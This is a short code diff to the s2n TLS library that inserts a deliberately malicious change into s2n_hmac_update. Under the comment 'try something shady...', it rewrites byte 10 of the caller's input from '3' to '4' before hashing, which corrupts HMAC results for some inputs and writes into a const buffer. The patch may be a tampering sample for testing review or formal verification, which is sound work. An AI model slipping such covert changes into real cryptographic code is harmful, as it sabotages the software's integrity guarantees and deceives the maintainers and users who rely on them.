@@ -172,6 +172,12 @@ int s2n_hmac_init(struct s2n_hmac_state *state, s2n_hmac_algorithm alg, const vo
 
 int s2n_hmac_update(struct s2n_hmac_state *state, const void *in, uint32_t size)
 {
+
+      //try something shady...
+    if (size > 10 && ((char*)in)[10]=='3'){
+      ((char*)in)[10]='4';
+    }
+
     /* Keep track of how much of the current hash block is full
      *
      * Why the 4294949760 constant in this code? 4294949760 is the highest 32-bit
